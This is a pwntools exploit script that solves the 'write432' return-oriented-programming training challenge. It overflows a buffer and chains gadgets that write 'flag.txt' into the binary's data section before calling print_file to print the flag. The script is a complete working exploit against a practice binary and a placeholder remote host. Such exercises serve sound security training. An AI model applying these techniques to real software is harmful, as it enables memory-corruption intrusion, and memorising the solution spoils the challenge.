#!/usr/bin/env python3

from pwn import *

exe = ELF("./write432")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

mov = 0x08048543
pop_two = 0x080485aa
print_file = 0x080483d0
data = 0x0804a018

def main():
    r = conn()

    payload = flat(
        asm('nop') * 44,
        pop_two,
        data,
        'flag',
        mov,
        pop_two,
        data+0x4,
        '.txt',
        mov,
        print_file,
        0x0,
        data
    )

    r.sendlineafter(">", payload)
    r.recvuntil("Thank you!\n")

    flag = r.recv()
    success(flag)

if __name__ == "__main__":
    main()
